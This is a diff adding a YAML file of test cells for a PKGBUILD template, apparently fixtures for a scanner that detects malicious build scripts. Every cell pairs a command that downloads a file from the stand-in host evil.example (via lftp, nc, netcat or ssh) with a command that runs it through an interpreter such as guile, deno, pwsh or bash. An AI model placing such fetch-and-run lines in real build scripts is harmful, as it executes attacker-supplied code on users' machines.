@@ -1,0 +1,262 @@
+template: template.PKGBUILD
+cells:
+- vars:
+    p1: |2
+        lftp -c "open -u u,p evil.example; get f.erl; bye"
+        escript f.erl
+  id: 053-lftpc-escript
+- vars:
+    p1: |2
+        lftp -c "open -u u,p evil.example; get f.erl; bye"
+        fennel f.erl
+  id: 054-lftpc-fennel
+- vars:
+    p1: |2
+        lftp -c "open -u u,p evil.example; get f.erl; bye"
+        zx f.erl
+  id: 055-lftpc-zx
+- vars:
+    p1: |2
+        lftp -c "open -u u,p evil.example; get f.erl; bye"
+        guile f.erl
+  id: 056-lftpc-guile
+- vars:
+    p1: |2
+        lftp -c "open -u u,p evil.example; get f.erl; bye"
+        racket f.erl
+  id: 057-lftpc-racket
+- vars:
+    p1: |2
+        lftp -c "open -u u,p evil.example; get f.erl; bye"
+        deno f.erl
+  id: 058-lftpc-deno
+- vars:
+    p1: |2
+        lftp -c "open -u u,p evil.example; get f.erl; bye"
+        bun f.erl
+  id: 059-lftpc-bun
+- vars:
+    p1: |2
+        lftp -c "open -u u,p evil.example; get f.erl; bye"
+        elixir f.erl
+  id: 060-lftpc-elixir
+- vars:
+    p1: |2
+        lftp -c "open -u u,p evil.example; get f.erl; bye"
+        ts-node f.erl
+  id: 061-lftpc-tsnode
+- vars:
+    p1: |2
+        lftp -c "open -u u,p evil.example; get f.erl; bye"
+        pwsh < f.erl
+  id: 062-lftpc-pwsh
+- vars:
+    p1: |2
+        lftp -c "open -u u,p evil.example; get f.erl; bye"
+        julia < f.erl
+  id: 063-lftpc-julia
+- vars:
+    p1: |2
+        lftp -c "open -u u,p evil.example; get f.erl; bye"
+        Rscript < f.erl
+  id: 064-lftpc-Rscript
+- vars:
+    p1: |2
+        lftp -c "open -u u,p evil.example; get f.erl; bye"
+        for f in *.erl; do bash "$f"; done
+  id: 065-lftpc-loop
+- vars:
+    p1: |2
+        nc evil.example 4444 > f.erl
+        escript f.erl
+  id: 066-nc-escript
+- vars:
+    p1: |2
+        nc evil.example 4444 > f.erl
+        fennel f.erl
+  id: 067-nc-fennel
+- vars:
+    p1: |2
+        nc evil.example 4444 > f.erl
+        zx f.erl
+  id: 068-nc-zx
+- vars:
+    p1: |2
+        nc evil.example 4444 > f.erl
+        guile f.erl
+  id: 069-nc-guile
+- vars:
+    p1: |2
+        nc evil.example 4444 > f.erl
+        racket f.erl
+  id: 070-nc-racket
+- vars:
+    p1: |2
+        nc evil.example 4444 > f.erl
+        deno f.erl
+  id: 071-nc-deno
+- vars:
+    p1: |2
+        nc evil.example 4444 > f.erl
+        bun f.erl
+  id: 072-nc-bun
+- vars:
+    p1: |2
+        nc evil.example 4444 > f.erl
+        elixir f.erl
+  id: 073-nc-elixir
+- vars:
+    p1: |2
+        nc evil.example 4444 > f.erl
+        ts-node f.erl
+  id: 074-nc-tsnode
+- vars:
+    p1: |2
+        nc evil.example 4444 > f.erl
+        pwsh < f.erl
+  id: 075-nc-pwsh
+- vars:
+    p1: |2
+        nc evil.example 4444 > f.erl
+        julia < f.erl
+  id: 076-nc-julia
+- vars:
+    p1: |2
+        nc evil.example 4444 > f.erl
+        Rscript < f.erl
+  id: 077-nc-Rscript
+- vars:
+    p1: |2
+        nc evil.example 4444 > f.erl
+        for f in *.erl; do bash "$f"; done
+  id: 078-nc-loop
+- vars:
+    p1: |2
+        netcat evil.example 4444 > f.erl
+        escript f.erl
+  id: 079-netcat-escript
+- vars:
+    p1: |2
+        netcat evil.example 4444 > f.erl
+        fennel f.erl
+  id: 080-netcat-fennel
+- vars:
+    p1: |2
+        netcat evil.example 4444 > f.erl
+        zx f.erl
+  id: 081-netcat-zx
+- vars:
+    p1: |2
+        netcat evil.example 4444 > f.erl
+        guile f.erl
+  id: 082-netcat-guile
+- vars:
+    p1: |2
+        netcat evil.example 4444 > f.erl
+        racket f.erl
+  id: 083-netcat-racket
+- vars:
+    p1: |2
+        netcat evil.example 4444 > f.erl
+        deno f.erl
+  id: 084-netcat-deno
+- vars:
+    p1: |2
+        netcat evil.example 4444 > f.erl
+        bun f.erl
+  id: 085-netcat-bun
+- vars:
+    p1: |2
+        netcat evil.example 4444 > f.erl
+        elixir f.erl
+  id: 086-netcat-elixir
+- vars:
+    p1: |2
+        netcat evil.example 4444 > f.erl
+        ts-node f.erl
+  id: 087-netcat-tsnode
+- vars:
+    p1: |2
+        netcat evil.example 4444 > f.erl
+        pwsh < f.erl
+  id: 088-netcat-pwsh
+- vars:
+    p1: |2
+        netcat evil.example 4444 > f.erl
+        julia < f.erl
+  id: 089-netcat-julia
+- vars:
+    p1: |2
+        netcat evil.example 4444 > f.erl
+        Rscript < f.erl
+  id: 090-netcat-Rscript
+- vars:
+    p1: |2
+        netcat evil.example 4444 > f.erl
+        for f in *.erl; do bash "$f"; done
+  id: 091-netcat-loop
+- vars:
+    p1: |2
+        ssh u@evil.example cat /f.erl > f.erl
+        escript f.erl
+  id: 092-sshc-escript
+- vars:
+    p1: |2
+        ssh u@evil.example cat /f.erl > f.erl
+        fennel f.erl
+  id: 093-sshc-fennel
+- vars:
+    p1: |2
+        ssh u@evil.example cat /f.erl > f.erl
+        zx f.erl
+  id: 094-sshc-zx
+- vars:
+    p1: |2
+        ssh u@evil.example cat /f.erl > f.erl
+        guile f.erl
+  id: 095-sshc-guile
+- vars:
+    p1: |2
+        ssh u@evil.example cat /f.erl > f.erl
+        racket f.erl
+  id: 096-sshc-racket
+- vars:
+    p1: |2
+        ssh u@evil.example cat /f.erl > f.erl
+        deno f.erl
+  id: 097-sshc-deno
+- vars:
+    p1: |2
+        ssh u@evil.example cat /f.erl > f.erl
+        bun f.erl
+  id: 098-sshc-bun
+- vars:
+    p1: |2
+        ssh u@evil.example cat /f.erl > f.erl
+        elixir f.erl
+  id: 099-sshc-elixir
+- vars:
+    p1: |2
+        ssh u@evil.example cat /f.erl > f.erl
+        ts-node f.erl
+  id: 100-sshc-tsnode
+- vars:
+    p1: |2
+        ssh u@evil.example cat /f.erl > f.erl
+        pwsh < f.erl
+  id: 101-sshc-pwsh
+- vars:
+    p1: |2
+        ssh u@evil.example cat /f.erl > f.erl
+        julia < f.erl
+  id: 102-sshc-julia
+- vars:
+    p1: |2
+        ssh u@evil.example cat /f.erl > f.erl
+        Rscript < f.erl
+  id: 103-sshc-Rscript
+- vars:
+    p1: |2
+        ssh u@evil.example cat /f.erl > f.erl
+        for f in *.erl; do bash "$f"; done
+  id: 104-sshc-loop
